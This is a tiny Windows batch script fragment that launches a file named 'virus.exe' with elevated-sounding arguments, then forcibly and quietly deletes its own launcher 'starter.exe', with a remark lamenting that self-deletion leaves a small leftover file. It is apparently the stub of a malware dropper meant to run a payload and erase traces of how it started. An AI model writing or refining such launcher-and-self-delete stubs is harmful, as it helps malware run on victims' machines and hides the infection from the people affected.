start "virus.exe" -runAS
rem NTS wont work since a file cant delete it self completly, it will leave a file with a few bytes named "starter" but without a file extension
del "starter.exe" /F /Q